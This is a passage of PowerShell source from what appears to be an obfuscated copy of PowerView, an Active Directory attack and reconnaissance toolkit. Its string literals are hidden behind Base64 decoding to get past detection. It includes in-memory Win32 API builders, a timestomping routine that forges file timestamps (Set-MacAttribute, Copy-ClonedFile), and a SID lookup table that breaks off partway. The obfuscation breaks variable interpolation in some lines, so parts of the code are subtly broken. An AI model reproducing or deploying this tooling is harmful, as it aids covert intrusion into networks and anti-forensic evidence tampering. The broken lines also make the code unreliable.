function New-InMemoryModule
{


    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

    ForEach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UnVu"))))
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}




function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFyYW1ldGVyVHlwZXM=")))] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24=")))] = $NativeCallingConvention }
    if ($Charset) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hhcnNldA==")))] = $Charset }
    if ($SetLastError) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0TGFzdEVycm9y")))] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE5hbWVzcGFjZS4kRGxsTmFtZQ=="))))
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE5hbWVzcGFjZS4kRGxsTmFtZQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLEJlZm9yZUZpZWxkSW5pdA=="))))
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLEJlZm9yZUZpZWxkSW5pdA=="))))
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLFN0YXRpYyxQaW52b2tlSW1wbA=="))),
                $ReturnType,
                $ParameterTypes)

            
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0"))), $Null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0TGFzdEVycm9y"))))
            $CallingConventionField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2FsbGluZ0NvbnZlbnRpb24="))))
            $CharsetField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hhclNldA=="))))
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGlj"))), $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    ForEach ($Key in $EnumElements.Keys)
    {
        
        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}




function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QW5zaUNsYXNzLAogICAgICAgIENsYXNzLAogICAgICAgIFB1YmxpYywKICAgICAgICBTZWFsZWQsCiAgICAgICAgQmVmb3JlRmllbGRJbml0")))

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l6ZUNvbnN0")))))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    
    
    
    ForEach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field][([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG9zaXRpb24=")))]
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    ForEach ($Field in $Fields)
    {
        $FieldName = $Field[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmllbGROYW1l")))]
        $FieldProp = $Field[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]

        $Offset = $FieldProp[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2Zmc2V0")))]
        $Type = $FieldProp[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHlwZQ==")))]
        $MarshalAs = $FieldProp[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFyc2hhbEFz")))]

        $NewField = $StructBuilder.DefineField($FieldName, $Type, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGlj"))))

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    
    
    $SizeMethod = $StructBuilder.DefineMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U2l6ZQ=="))),
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLCBTdGF0aWM="))),
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0VHlwZUZyb21IYW5kbGU=")))))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l6ZU9m"))), [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    
    
    $ImplicitConverter = $StructBuilder.DefineMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b3BfSW1wbGljaXQ="))),
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpdmF0ZVNjb3BlLCBQdWJsaWMsIFN0YXRpYywgSGlkZUJ5U2lnLCBTcGVjaWFsTmFtZQ=="))),
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0VHlwZUZyb21IYW5kbGU=")))))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHRyVG9TdHJ1Y3R1cmU="))), [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}








function Export-PowerViewCSV {

    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True,
        ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject]
        $InputObject,

        [Parameter(Mandatory=$True, Position=0)]
        [Alias('PSPath')]
        [String]
        $OutFile
    )

    process {
        
        $ObjectCSV = $InputObject | ConvertTo-Csv -NoTypeInformation

        
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex';
        $Null = $Mutex.WaitOne()

        if (Test-Path -Path $OutFile) {
            
            $ObjectCSV | Foreach-Object {$Start=$True}{if ($Start) {$Start=$False} else {$_}} | Out-File -Encoding ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVNDSUk="))) -Append -FilePath $OutFile
        }
        else {
            $ObjectCSV | Out-File -Encoding ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVNDSUk="))) -Append -FilePath $OutFile
        }

        $Mutex.ReleaseMutex()
    }
}



function Set-MacAttribute {

    [CmdletBinding(DefaultParameterSetName = 'Touch')]
    Param (

        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $FilePath,

        [Parameter(ParameterSetName = 'Touch')]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $OldFilePath,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Modified,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Accessed,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Created,

        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $AllMacAttributes
    )

    
    function Get-MacAttribute {

        param($OldFileName)

        if (!(Test-Path -Path $OldFileName)) {Throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsZSBOb3QgRm91bmQ=")))}
        $FileInfoObject = (Get-Item $OldFileName)

        $ObjectProperties = @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW9kaWZpZWQ="))) = ($FileInfoObject.LastWriteTime);
                              ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjZXNzZWQ="))) = ($FileInfoObject.LastAccessTime);
                              ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRlZA=="))) = ($FileInfoObject.CreationTime)};
        $ResultObject = New-Object -TypeName PSObject -Property $ObjectProperties
        Return $ResultObject
    }

    $FileInfoObject = (Get-Item -Path $FilePath)

    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsTWFjQXR0cmlidXRlcw==")))]) {
        $Modified = $AllMacAttributes
        $Accessed = $AllMacAttributes
        $Created = $AllMacAttributes
    }

    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2xkRmlsZVBhdGg=")))]) {
        $CopyFileMac = (Get-MacAttribute $OldFilePath)
        $Modified = $CopyFileMac.Modified
        $Accessed = $CopyFileMac.Accessed
        $Created = $CopyFileMac.Created
    }

    if ($Modified) {$FileInfoObject.LastWriteTime = $Modified}
    if ($Accessed) {$FileInfoObject.LastAccessTime = $Accessed}
    if ($Created) {$FileInfoObject.CreationTime = $Created}

    Return (Get-MacAttribute $FilePath)
}


function Copy-ClonedFile {


    param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $SourceFile,

        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DestFile
    )

    
    Set-MacAttribute -FilePath $SourceFile -OldFilePath $DestFile

    
    Copy-Item -Path $SourceFile -Destination $DestFile
}


function Get-IPAddress {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ''
    )
    process {
        try {
            
            $Results = @(([Net.Dns]::GetHostEntry($ComputerName)).AddressList)

            if ($Results.Count -ne 0) {
                ForEach ($Result in $Results) {
                    
                    if ($Result.AddressFamily -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW50ZXJOZXR3b3Jr")))) {
                        $Result.IPAddressToString
                    }
                }
            }
        }
        catch {
            Write-Verbose -Message ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q291bGQgbm90IHJlc29sdmUgaG9zdCB0byBhbiBJUCBBZGRyZXNzLg==")))
        }
    }
    end {}
}


function Convert-NameToSid {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        $ObjectName,

        [String]
        $Domain = (Get-NetDomain).Name
    )

    process {
        
        $ObjectName = $ObjectName -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))
        
        if($ObjectName.contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
            
            $Domain = $ObjectName.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[0]
            $ObjectName = $ObjectName.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
        }

        try {
            $Obj = (New-Object System.Security.Principal.NTAccount($Domain,$ObjectName))
            $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        }
        catch {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52YWxpZCBvYmplY3QvbmFtZTogJERvbWFpblwkT2JqZWN0TmFtZQ==")))
            $Null
        }
    }
}


function Convert-SidToName {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $SID
    )

    process {
        try {
            $SID2 = $SID.trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))))

            
            
            Switch ($SID2)
            {
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTA=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TnVsbCBBdXRob3JpdHk="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTAtMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9ib2R5"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTE=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V29ybGQgQXV0aG9yaXR5"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTEtMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXZlcnlvbmU="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTI=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWwgQXV0aG9yaXR5"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTItMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWw="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTItMQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29uc29sZSBMb2dvbiA="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTM=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBBdXRob3JpdHk="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBPd25lcg=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBHcm91cA=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMg==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBPd25lciBTZXJ2ZXI="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMw==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBHcm91cCBTZXJ2ZXI="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtNA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXIgUmlnaHRz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTQ=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uLXVuaXF1ZSBBdXRob3JpdHk="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTU=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQgQXV0aG9yaXR5"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlhbHVw"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMg==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmV0d29yaw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMw==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QmF0Y2g="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtNA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW50ZXJhY3RpdmU="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtNg==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZQ=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtNw==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QW5vbnltb3Vz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtOA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJveHk="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtOQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW50ZXJwcmlzZSBEb21haW4gQ29udHJvbGxlcnM="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTA=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsIFNlbGY="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTE=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXV0aGVudGljYXRlZCBVc2Vycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTI=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdHJpY3RlZCBDb2Rl"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTM=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGVybWluYWwgU2VydmVyIFVzZXJz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTQ=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlIEludGVyYWN0aXZlIExvZ29u"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTU=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhpcyBPcmdhbml6YXRpb24g"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTc=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhpcyBPcmdhbml6YXRpb24g"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTg=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWwgU3lzdGVt"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTk=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQgQXV0aG9yaXR5"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjA=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQgQXV0aG9yaXR5"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtODAtMA==")))    { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsIFNlcnZpY2VzIA=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBZG1pbmlzdHJhdG9ycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ1")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxVc2Vycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ2")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxHdWVzdHM="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ3")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQb3dlciBVc2Vycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ4")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBY2NvdW50IE9wZXJhdG9ycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxTZXJ2ZXIgT3BlcmF0b3Jz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTUw")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQcmludCBPcGVyYXRvcnM="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTUx")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxCYWNrdXAgT3BlcmF0b3Jz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTUy")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSZXBsaWNhdG9ycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU0")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQcmUtV2luZG93cyAyMDAwIENvbXBhdGlibGUgQWNjZXNz"))) }
